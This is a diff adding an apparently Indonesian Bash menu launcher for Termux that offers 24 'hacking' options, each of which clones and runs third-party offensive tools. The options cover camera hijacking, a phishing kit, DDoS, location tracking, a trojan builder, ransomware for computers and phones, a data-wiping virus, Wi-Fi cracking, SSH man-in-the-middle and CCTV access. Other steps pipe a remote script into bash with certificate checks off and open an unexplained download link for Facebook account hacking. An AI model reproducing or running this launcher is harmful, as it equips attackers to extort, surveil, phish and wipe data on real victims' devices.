@@ -1,0 +1,228 @@
+#!/bin/bash
+
+clear
+# Variables
+b='\033[1m'
+u='\033[4m'
+bl='\E[30m'
+r='\E[31m'
+g='\E[32m'
+bu='\E[34m'
+m='\E[35m'
+c='\E[36m'
+w='\E[37m'
+endc='\E[0m'
+enda='\033[0m'
+blue='\e[1;34m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+
+echo ""
+echo -e $red  "   / \   _ __ (_)_ __   | |_   _(_)____ "
+echo -e $red  "  / _ \ | '_ \| | '_ \  | | | | | |_  / "
+echo -e $red  " / ___ \| |_) | | |_) | | | |_| | |/ / "
+echo -e $enda "/_/   \_\ .__/|_| .__/  |_|\__,_|_/___| "
+echo -e $enda "        |_|     |_| "
+echo ""
+
+echo -e $red  "NAMA  : APIP LUIZ FEAT MAYA"
+echo -e $enda "TOOLS : V1"
+echo -e $red  "I'M FROM INDONESIA"
+
+echo -e $red "======================"
+echo -e $enda "1.HACK KAMERAH";
+echo -e $red  "2.PHISING LENGKAP";
+echo -e $enda "3.MATIKAN WIFI";
+echo -e $red  "4.DDOS (KALI LINUX)";
+echo -e $enda "5.DNS";
+echo -e $red  "6.LACAK LOKASI";
+echo -e $enda "7.HACK HP(METASPLOIT)";
+echo -e $red  "8.HACK KOMPUTER(TROJAN)";
+echo -e $enda "9.VIRUS(ANDROID & WINDOWS)"
+echo -e $red  "10.HACK WEBSITE VULN(SQLMAP)";
+echo -e $enda "11.HACK AKUN FB";
+echo -e $red  "12.RAMSOMWARE (KOMPUTER)";
+echo -e $enda "13.RAMSOMWARE (HP)";
+echo -e $red  "14.VIRUS (PENGHAPUS DATA NO TERDETEK)";
+echo -e $enda "15.HACK WIFI(ADAPTER)";
+echo -e $red  "16.NMAP(JARINGAN)";
+echo -e $enda "17.PERISAI WIFI(WIRESHARK)";
+echo -e $red  "18.MITM";
+echo -e $enda "19.DORK WEB VULN";
+echo -e $red  "20.INSTALL TERMINAL KALI";
+echo -e $enda "21.INSTALL TERMINAL UBUNTU";
+echo -e $red  "22.INSTALL TERMINAL LINUX DEBIAN";
+echo -e $enda "23.INSTALL DEKSTOP FULL KALI LINUX(NETHUNTER)";
+echo -e $red  "24.AKSES CCTV NEGARA TERTENTU";
+
+echo -e $enda  "========================"
+echo -e "╭─[SILAKAN PILIH]" |lolcat
+read -p "╰→PILIH=" pil;
+
+case $pil in
+
+1)git clone https://github.com/KasRoudra/CamHacker
+cd CamHacker
+bash ch.sh
+
+;;
+
+2)git clone https://github.com/KasRoudra/MaxPhisher 
+cd MaxPhisher
+python3 maxphisher.py
+
+;;
+
+3)pkg update -y && pkg upgrade -y
+pkg install git -y
+pkg install python -y
+git clone https://github.com/DARK-02/Termux_Wifi
+cd Termux_Wifi
+python3 run.py
+
+;;
+
+4)git clone https://github.com/Ha3MrX/DDos-Attack
+cd DDos-Attack
+chmod +x ddos-attack.py
+python ddos-attack.py
+
+;;
+
+5)ping 8.8.8.8
+
+;;
+
+6)git clone https://github.com/thewhiteh4t/seeker.git
+cd seeker/
+chmod +x install.sh
+./install.sh
+
+;;
+
+7)pkg install unstable-repo
+pkg install metasploit
+msfconsole
+
+;;
+
+8)git clone https://github.com/Screetsec/TheFatRat.git
+cd TheFatRat
+chmod +x setup.sh && ./setup.sh
+
+;;
+
+9)apt-get update && apt-get upgrade
+apt-get install git python
+git clone https://github.com/Gameye98/vbug
+cd vbug
+python3 vbug.py
+
+;;
+
+10)git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+python sqlmap.py -h
+
+;;
+
+11)xdg-open "https://sfile.mobi/377bfFda3es"
+
+;;
+
+12)git clone https://github.com/Err0r-ICA/Ransomware
+cd Ransomware
+python3 Ransomware
+
+;;
+
+13)git clone https://github.com/termuxhackers-id/SARA && cd SARA && bash installtermux.sh
+
+;;
+
+14)git clone https://github.com/fahadsyihab06/virusv1
+cd virusv1
+bash virus.sh
+
+;;
+
+15)git clone https://github.com/derv82/wifite2.git
+cd wifite2
+./Wifite.py
+
+;;
+
+16)# Clone this repository
+git clone --recursive https://github.com/trimstray/sandmap
+
+# Go into the repository
+cd sandmap
+
+# Install
+./setup.sh install
+
+# Run the app
+sandmap
+
+;;
+
+17)apt instal git
+git clone https://github.com/471D38UNNUX/Wireshark-Installer
+cd Wireshark-Installer
+bash Wireshark-Installer-For-Termux.sh
+tsu
+
+;;
+
+18)git clone https://github.com/jtesta/ssh-mitm
+cd ssh-mitm
+
+;;
+
+19)pkg install git python
+git clone https://github.com/Yutixcode/Dolkings
+cd Dolkings
+pip install -r requirements.txt
+python dolkings.py
+
+;;
+
+20)curl -k -s https://raw.githubusercontent.com/blacklanternsecurity/kali-setup-script/master/kali-setup-script.sh | bash
+
+;;
+
+21)pkg install parrot-distro
+parrot-distro install ubuntu
+distro login ubuntu
+
+;;
+
+22)pkg install parrot-distro
+parrot-distro install debian
+distro login debian
+
+;;
+
+23)termux-setup-storage
+pkg install wget
+wget -O install-nethunter-termux https://offs.ec/2MceZWr
+chmod +x install-nethunter-termux
+./install-nethunter-termux
+
+;;
+
+24)apt-get install python3
+
+apt-get install git
+
+git clone https://github.com/AngelSecurityTeam/Cam-Hackers
+
+cd Cam-Hackers
+
+pip install -r requirements.txt
+
+python3 cam-hackers.py
+
+;;
+
+esac
+
